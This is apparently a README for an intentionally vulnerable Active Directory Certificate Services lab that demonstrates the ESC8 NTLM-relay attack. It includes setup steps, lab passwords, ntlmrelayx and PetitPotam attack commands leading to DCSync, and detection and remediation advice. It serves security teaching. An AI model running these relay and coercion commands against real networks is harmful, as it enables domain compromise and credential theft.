# ADCS ESC8 Lab - NTLM Relay to AD CS HTTP Endpoints

> **⚠️ WARNING**: This is an intentionally vulnerable lab environment for educational purposes only. Do NOT deploy in production!

## Overview

Fully automated Active Directory Certificate Services lab demonstrating **ESC8 vulnerability**.
**ESC8** exploits the **Certification Authority Web Enrollment** service (HTTP/S endpoint). Since this service often supports NTLM authentication and does not enforce signing, an attacker can coerce a victim (e.g., Domain Controller) to authenticate to the attacker via NTLM (using PetitPotam), repeat (relay) that authentication to the CA Web Enrollment Endpoint, and obtain a certificate for the victim machine.

### What is ESC8?

It relies on:
1.  **Web Enrollment Enabled**: The CA serves a web interface (usually at `/certsrv`).
2.  **NTLM Support**: The IIS endpoint accepts NTLM auth (common default).
3.  **Missing NTLM MIC/Session Signing**: The relay attack is possible because the "CertSrv" application does not strictly validate the NTLM session binding (Extended Protection for Authentication).

---

## Lab Architecture

```
┌──────────────────────────────────────┐
│   Host-Only Network: 192.168.57.0/24│
│   Gateway: (Isolated)                │
└──────────────────────────────────────┘
           │
    ┌──────┴───────┐
    │              │
┌───▼────┐    ┌───▼────┐
│ESC8-DC │    │CLT-01  │
│Win2019 │    │ Win 10 │
└────────┘    └────────┘
.57.30        .57.31

Domain: adcs.local
CA: ADCS-CA-ESC8 (Manual Installation)
Vulnerability: Web Enrollment (HTTP) Installed + Default IIS Settings
```

---

## Prerequisites

- **VirtualBox** 7.x
- **Vagrant** 2.3+
- **12GB RAM** minimum (DC: 8GB, CLIENT: 4GB)
- **50GB free disk space**

---

## Provisioning Walkthrough

### 1. Start the Domain Controller
1.  **Launch the DC**:
    ```powershell
    cd E:\ADCS\adcs-esc8-lab
    vagrant up dc
    ```
2.  **Wait**: ~15 minutes for Hostname change, AD DS installation, and User creation.

### 2. Manual Certificate Authority Installation
1.  **Log in to DC**: `192.168.57.30` as `Administrator`.
2.  **Install Role**: Active Directory Certificate Services.
3.  **Select Role Services**:
    -   **Certification Authority**
    -   **Certification Authority Web Enrollment** (Critical for ESC8!)
    -   *IIS will be installed automatically.*
4.  **Configure CA**:
    -   Type: **Enterprise CA**
    -   Key: **RSA 2048**
    -   Name: `ADCS-CA-ESC8`

### 3. Configure ESC8 Vulnerability (Default State)
ESC8 is often a design flaw in the default installation. No "manual misconfiguration" is strictly needed beyond simply **installing Web Enrollment**.

1.  Verify the endpoint exists:
    Open Browser on DC -> `http://localhost/certsrv`.
2.  Verify NTLM is enabled (Default in IIS).

### 4. Provision the Client (Attacker Machine)
1.  **Launch Client**:
    ```powershell
    vagrant up client
    ```
2.  **Login**: `johndoe` (Standard User).

---

## Lab Credentials

| Username | Password | Email | Role |
|----------|----------|-------|------|
| `ADCS\Administrator` | `P@ssw0rd!123` | - | Domain Admin |
| `ADCS\johndoe` | `Summer2024!` | johndoe@adcs.local | User / Attacker |
| `ADCS\janesmith` | `Winter2024!` | janesmith@adcs.local | User |
| `ADCS\alicejohnson` | `Spring2024!` | alicejohnson@adcs.local | User |
| `ADCS\bobwilliams` | `Autumn2024!` | bobwilliams@adcs.local | User |
| `ADCS\charliebrown` | `Coffee2024!` | charliebrown@adcs.local | User |

---

## ESC8 Attack Walkthrough

### 1. Preparation (Attacker)
On the Client machine (acting as attacker), you need tools like `impacket-ntlmrelayx` (Python) or a Windows equivalent like `Inveigh` / `Certipy` (remote).
*Note: Typical ESC8 exploit chains run from a Linux attacker box, but can be done from Windows if Python is set up.*

### 2. The Attack Chain
1.  **Start Relay**:
    Listen for NTLM authentication and forward it to the CA Web Enrollment URL.
    `ntlmrelayx.py -t http://192.168.57.30/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`
    *(If running from Windows, ensure port 445/80 aren't bound).*

2.  **Coerce Authentication (PetitPotam)**:
    Force the Domain Controller (`ESC8-DC`) to authenticate to the Attacker Machine (`ESC8-CLIENT`).
    `PetitPotam.exe 192.168.57.31 192.168.57.30`

3.  **Capture Certificate**:
    -   DC connects to Attacker (NTLM).
    -   Attacker relays to `http://ESC8-DC/certsrv`.
    -   CA issues a certificate for `ESC8-DC$`.
    -   Relay tool captures the Base64 certificate.

4.  **Escalation**:
    -   Use the certificate to request a Ticket Granting Ticket (TGT) for the DC.
    -   DCSync the domain.

---

## Detection

### Event IDs
| Event ID | Source | Description |
|----------|--------|-------------|
| 4887 | Microsoft-Windows-CertificationAuthority | Certificate Issued (Source IP might be the relay machine, not the subject) |
| 4624 | Security | IIS Logon (Logon Type 3 - Network). Look for NTLM. |

### Remediation
1.  **Remove Web Enrollment**: If not strictly needed, uninstall it.
2.  **Enable EPA**: Enable **Extended Protection for Authentication** (EPA) in IIS on the CertSrv directory. This binds the TLS channel to the NTLM session, breaking relaying (requires HTTPS).
3.  **Disable NTLM**: Force Windows Authentication to use **Kerberos only** or Require **HTTPS** with Client Certificates.

---

## Lab Management

```powershell
vagrant up      # Start
vagrant destroy # Destroy
```
